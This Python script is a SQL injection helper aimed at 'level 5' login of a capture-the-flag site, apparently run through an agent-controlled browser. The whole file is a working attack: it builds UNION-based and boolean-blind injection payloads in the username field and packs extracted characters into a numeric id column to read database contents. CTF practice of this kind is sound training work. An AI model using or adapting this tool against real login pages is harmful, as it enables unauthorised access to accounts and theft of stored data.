import argparse
import json
import os
import shutil
import subprocess
import sys


DEFAULT_LOGIN_PATH = "/api/levels/5/login"


def resolve_agent_browser() -> str:
    env_value = os.environ.get("AGENT_BROWSER_BIN")
    if env_value:
        return env_value

    exe_candidate = os.path.expandvars(
        r"%APPDATA%\npm\node_modules\agent-browser\bin\agent-browser-win32-x64.exe"
    )
    if os.path.exists(exe_candidate):
        return exe_candidate

    for candidate in ("agent-browser", "agent-browser.ps1", "agent-browser.cmd"):
        resolved = shutil.which(candidate)
        if resolved:
            return resolved

    raise FileNotFoundError("agent-browser executable not found")


def run_agent(*args: str) -> str:
    result = subprocess.run(
        [resolve_agent_browser(), *args],
        capture_output=True,
        text=True,
        encoding="utf-8",
    )
    if result.returncode != 0:
        raise RuntimeError(
            f"agent-browser failed ({result.returncode})\nSTDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
        )
    return result.stdout.strip()


def list_tabs() -> str:
    return run_agent("tab", "list")


def find_ctf_tab() -> int | None:
    output = list_tabs()
    candidates = []
    for line in output.splitlines():
        line = line.strip()
        if not (line.startswith("[") or line.startswith("→ [")):
            continue
        if "https://ctf.centos.hk/" not in line:
            continue

        start = line.find("[")
        end = line.find("]", start + 1)
        if start == -1 or end == -1:
            continue
        candidates.append(int(line[start + 1 : end]))
    return candidates[-1] if candidates else None


def switch_tab(tab: int | None) -> None:
    target = tab if tab is not None else find_ctf_tab()
    if target is not None:
        run_agent("tab", str(target))


def browser_eval(js: str) -> str:
    return run_agent("eval", js)


def post_login(username: str, password: str, login_path: str) -> dict:
    body = json.dumps({"username": username, "password": password}, ensure_ascii=False)
    js = (
        "(async()=>{"
        f"const body={body};"
        f"const response=await fetch({json.dumps(login_path)},"
        "{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});"
        "return JSON.stringify({status:response.status,text:await response.text()});"
        "})()"
    )
    raw = browser_eval(js)
    parsed = json.loads(raw)
    if isinstance(parsed, str):
        parsed = json.loads(parsed)
    return parsed


def packed_expr(source_sql: str, offset: int, width: int) -> str:
    parts = []
    for index in range(width):
        pos = offset + index
        shift = index * 7
        term = f"coalesce(unicode(substr(({source_sql}),{pos},1)),0)"
        if shift:
            term = f"({term} << {shift})"
        parts.append(term)
    return " + ".join(parts)


def decode_packed(value: int, width: int) -> str:
    chars = []
    for index in range(width):
        code = (value >> (index * 7)) & 0x7F
        if code == 0:
            break
        chars.append(chr(code))
    return "".join(chars)


def sql_quote(value: str) -> str:
    return value.replace("'", "''")


def main() -> int:
    parser = argparse.ArgumentParser(description="Level 5 SQLi helper")
    parser.add_argument("--tab", type=int)
    parser.add_argument("--login-path", default=DEFAULT_LOGIN_PATH)
    subparsers = parser.add_subparsers(dest="command", required=True)

    request_parser = subparsers.add_parser("request", help="Send a raw username/password payload")
    request_parser.add_argument("--username", required=True)
    request_parser.add_argument("--password", default="x")

    scalar_parser = subparsers.add_parser("scalar", help="Read a scalar numeric SQL expression via response.data.id")
    scalar_parser.add_argument("--expr", required=True, help="SQLite scalar expression used as UNION id column")
    scalar_parser.add_argument("--password", default="x")

    bool_parser = subparsers.add_parser("bool", help="Evaluate a boolean SQL condition via row existence")
    bool_parser.add_argument("--condition", required=True, help="SQLite boolean expression used in UNION WHERE clause")
    bool_parser.add_argument("--password", default="x")

    pack_parser = subparsers.add_parser("pack", help="Pack ASCII text from a SQL scalar string expression into id")
    pack_parser.add_argument("--source", required=True, help="SQLite SQL expression that returns a single text value")
    pack_parser.add_argument("--offset", type=int, required=True, help="1-based character offset")
    pack_parser.add_argument("--width", type=int, default=7)
    pack_parser.add_argument("--password", default="x")

    args = parser.parse_args()
    switch_tab(args.tab)

    if args.command == "request":
        result = post_login(args.username, args.password, args.login_path)
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return 0

    if args.command == "scalar":
        payload = f"' AND 1=0 UNION SELECT {args.expr}, 'U', '{sql_quote(args.password)}' -- "
        result = post_login(payload, args.password, args.login_path)
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return 0

    if args.command == "bool":
        payload = f"' AND 1=0 UNION SELECT 1, 'U', '{sql_quote(args.password)}' WHERE {args.condition} -- "
        result = post_login(payload, args.password, args.login_path)
        inner = json.loads(result["text"])
        output = {"response": result, "inner": inner, "truthy": bool(inner.get("success"))}
        print(json.dumps(output, ensure_ascii=False, indent=2))
        return 0

    packed = packed_expr(args.source, args.offset, args.width)
    payload = f"' AND 1=0 UNION SELECT {packed}, 'U', '{sql_quote(args.password)}' -- "
    result = post_login(payload, args.password, args.login_path)

    decoded = None
    inner = None
    try:
        inner = json.loads(result["text"])
        value = inner["data"]["id"]
        decoded = decode_packed(int(value), args.width)
    except Exception:
        pass

    output = {"response": result, "inner": inner, "decoded": decoded}
    print(json.dumps(output, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
